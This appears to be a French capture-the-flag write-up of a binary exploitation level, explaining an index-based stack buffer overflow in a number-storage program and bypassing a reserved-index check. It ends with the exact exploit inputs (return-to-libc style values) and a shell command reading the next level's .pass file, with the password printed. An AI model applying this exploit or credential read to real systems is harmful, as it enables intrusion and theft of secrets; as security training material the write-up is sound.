Notre code decompiler nous montre que la fonctionalité de ce niveau est faite avec un programme en 3 commande :

store : Un stockage de données
read : Un système d’indexation
quit : Un exit utilisateur

Malgrés tout ça le code semble bien fait et assez sécurisé pour chaque commande on regarde donc un peu ce qui s'y pass et on observe ça :

Index: 3 → erreur (multiple de 3 ?)

if (index % 3 == 0 || ((number >> 24) & 0xFF) == 183)
    printf("This index is reserved!");
...

et Tableau de 100 entiers,  char storage[400] utilisé comme int[] int = 4 octet 400/4 = 100

Lecture dépasse command[4], fgets(command, 20, stdin)	Stack overflow

On a donc plusieurs opportunité pour attaqué.

Il faut être à l’affût de ces indices dans le code :

Un tableau ou buffer sans vérification de taille (index)

Un calcul d’adresse à la main (a1 + 4 * index)

Aucune limite sur index

Un buffer local sur la stack → donc un dépassement peut atteindre ret

Ce qui nous dirige vers la recherche de plusieurs element :

- trouver l’offset d’écriture pour ret
- repérer l’adresse de storage
- repérer l’adresse de retour
- calculer le bon index

Lorsqu’on voit une fonction comme store_number, qui fait :

c
Copier
Modifier
*((int*)(a1 + 4 * index)) = number;
Et qu’on sait que a1 pointe vers un buffer fixe en stack (ici char storage[400]), alors une écriture avec un index trop grand va déborder du tableau et aller écraser des variables locales, voire l’adresse de retour.

➡️ Cela donne un buffer overflow basé sur un index, ce qui est un classique d’exploitation.

Donc, le réflexe naturel ici serait :

« Est-ce que je peux écrire au bon endroit pour écraser ret ? »

Et si oui :

« Quel index utiliser pour écrire à cet endroit précis ? »

Go chercher maintenant :

```gdb

```



-------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC